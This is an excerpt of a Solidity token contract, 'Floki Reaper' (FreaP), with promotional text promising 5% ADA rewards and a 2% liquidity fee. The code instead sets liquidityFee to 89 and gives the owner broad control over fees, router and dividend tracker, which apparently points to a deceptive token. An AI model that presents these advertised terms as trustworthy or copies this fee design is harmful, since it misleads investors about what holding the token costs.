...
5% rewards Fees in ADA - directly auto claimed into your wallet just by holding Floki Reaper Tokens !
5% to marketing and 2% to liquidity pool.
WE:LCO:ME T0 T:HE WOR:LD 0F Floki Reaper 

Official Telegram group : https://thegrimreaper1
...
import "./FreaPDividendTracker.sol";

contract FreaP is ERC20, Ownable {
    ...
    FreaPDividendTracker public dividendTracker;
    ...
    uint256 public liquidityFee = 89;
    ...
    constructor() public ERC20("Floki Reaper", "FreaP") {

    	dividendTracker = new FreaPDividendTracker();

        _marketingWalletAddress = 0xEb1cD20612F040cfDBe54c98ac3D6694bc4262a8;
    ...
    function updateDividendTracker(address newAddress) public onlyOwner {
        require(newAddress != address(dividendTracker), "FreaP: The dividend tracker already has that address");

        FreaPDividendTracker newDividendTracker = FreaPDividendTracker(payable(newAddress));

        require(newDividendTracker.owner() == address(this), "FreaP: The new dividend tracker must be owned by the FreaP token contract");
    ...
    function updateUniswapV2Router(address newAddress) public onlyOwner {
        require(newAddress != address(uniswapV2Router), "FreaP: The router already has that address");
    ...
    function excludeFromFees(address account, bool excluded) public onlyOwner {
        require(_isExcludedFromFees[account] != excluded, "FreaP: Account is already the value of 'excluded'");
    ...
    function setAutomatedMarketMakerPair(address pair, bool value) public onlyOwner {
        require(pair != uniswapV2Pair, "FreaP: The PancakeSwap pair cannot be removed from automatedMarketMakerPairs");
    ...
    function _setAutomatedMarketMakerPair(address pair, bool value) private {
        require(automatedMarketMakerPairs[pair] != value, "FreaP: Automated market maker pair is already set to that value");
    ...
    function updateGasForProcessing(uint256 newValue) public onlyOwner {
        require(newValue >= 200000 && newValue <= 500000, "FreaP: gasForProcessing must be between 200,000 and 500,000");
        require(newValue != gasForProcessing, "FreaP: Cannot update gasForProcessing to same value");
